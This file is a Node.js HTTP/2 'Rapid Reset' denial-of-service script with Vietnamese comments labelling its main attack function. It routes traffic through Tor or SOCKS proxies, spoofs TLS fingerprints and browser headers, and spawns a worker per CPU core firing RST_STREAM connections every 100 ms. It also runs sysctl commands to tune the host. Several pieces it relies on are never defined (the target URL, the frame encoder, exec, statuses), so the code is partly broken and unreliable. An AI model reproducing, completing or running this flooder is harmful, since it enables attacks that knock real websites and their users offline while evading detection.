// made by @rapidreset (updated)
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const { Worker, isMainThread, parentPort } = require('worker_threads');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const { SocksClient } = require('socks');
const { generate: generateFingerprint } = require('tls-fingerprint');

// ===== CẤU HÌNH NÂNG CAO =====
const TOR_PROXY = { host: '127.0.0.1', port: 9050 };
const MAX_RETRY = 5;
const DYNAMIC_HEADERS = true;

// ===== KHỞI TẠO BIẾN =====
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];
let proxyList = [];
let isFull = process.argv.includes('--full');

// ===== TẠO TLS FINGERPRINT =====
const tlsOptions = {
  ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384',
  extensions: ['ALPN', 'SNI'],
  version: 'TLSv1.3'
};
const fingerprint = generateFingerprint(tlsOptions);

// ===== KẾT NỐI SOCKS5/TOR =====
async function connectViaSocks(proxy, targetHost, targetPort) {
  try {
    const { socket } = await SocksClient.createConnection({
      proxy: { ...proxy, type: 5 },
      destination: { host: targetHost, port: targetPort },
      command: 'connect'
    });
    return socket;
  } catch (e) {
    return null;
  }
}

// ===== HEADERS ĐỘNG =====
function generateAIOptimizedHeaders() {
  return {
    'sec-ch-ua-platform-version': '15.0.0',
    'sec-ch-ua-full-version-list': `"Chromium";v="${Math.random() * 100 + 116}", "Not.A/Brand";v="${Math.random() * 10}"`,
    'priority': `u=${Math.random()}, i`
  };
}

// ===== HÀM TẤN CÔNG CHÍNH =====
async function go(retry = 0) {
  if (retry > MAX_RETRY) return;

  try {
    const targetSocket = await connectViaSocks(TOR_PROXY, url.hostname, 443);
    if (!targetSocket) throw new Error('Connection failed');

    const tlsSocket = tls.connect({
      socket: targetSocket,
      servername: url.hostname,
      ciphers: tlsOptions.ciphers,
      secureOptions: crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT,
      fingerprint: fingerprint,
      rejectUnauthorized: false
    });

    tlsSocket.on('secureConnect', () => {
      if (tlsSocket.alpnProtocol === 'h2') {
        const rstStream = encodeRstStream(1, 3, Math.random() > 0.5 ? 0x8 : 0x0);
        tlsSocket.write(rstStream);
      }
    });

    tlsSocket.on('error', (e) => {
      if (ignoreCodes.includes(e.code)) return;
      setTimeout(() => go(retry + 1), 1000);
    });

  } catch (e) {
    setTimeout(() => go(retry + 1), 1000);
  }
}

// ===== WORKER THREADS =====
if (isMainThread) {
  const workers = [];
  for (let i = 0; i < os.cpus().length; i++) {
    workers.push(new Worker(__filename));
  }

  setInterval(() => {
    workers.forEach((worker, idx) => {
      worker.postMessage({ cmd: 'STATUS', id: idx });
    });
  }, 5000);

} else {
  parentPort.on('message', (msg) => {
    if (msg.cmd === 'STATUS') {
      parentPort.postMessage({ id: msg.id, stats: statuses });
    }
  });

  setInterval(() => {
    if (Math.random() < 0.8) go();
  }, 100);
}

// ===== TỐI ƯU TCP =====
function optimizeTCP() {
  const optimizations = [
    'sysctl -w net.ipv4.tcp_tw_reuse=1',
    'sysctl -w net.core.somaxconn=65535',
    'sysctl -w net.ipv4.tcp_fin_timeout=15'
  ];
  optimizations.forEach(cmd => exec(cmd));
}
optimizeTCP();

// ===== LOAD PROXY =====
function loadProxies() {
  try {
    proxyList = fs.readFileSync('proxyvn.txt', 'utf8')
      .split('\n')
      .filter(p => p.trim())
      .map(p => ({ host: p.split(':')[0], port: parseInt(p.split(':')[1]) }));
  } catch (e) {
    console.error('Sử dụng TOR mặc định do lỗi proxy');
  }
}
loadProxies();
